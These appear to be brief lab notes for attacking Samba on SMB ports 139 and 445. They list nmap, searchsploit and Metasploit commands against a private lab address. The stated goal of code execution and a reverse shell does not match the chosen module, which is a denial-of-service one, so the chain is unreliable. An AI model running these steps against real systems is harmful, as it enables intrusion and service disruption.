

## Aim

		trying to run remote code execution on port no 139 and 445 and want to reverse shell

## Exploit Chain

		1. search in nmap with -sC and -sV 
		2. search in searchsploit with service version
		3. serch in metasploit with auxiliary/dos/samba/read_nttrans_ea_list
		4. set parameter as required

## Commands

		1.nmap -sC 192.168.24.129 -p 139
		2. searchsploit samba 3.x
		3. msfconsole
		4. search samba 3.x
		5. use auxiliary/dos/samba/read_nttrans_ea_list
		6. set parameter (rhost ,lhost )
		7. run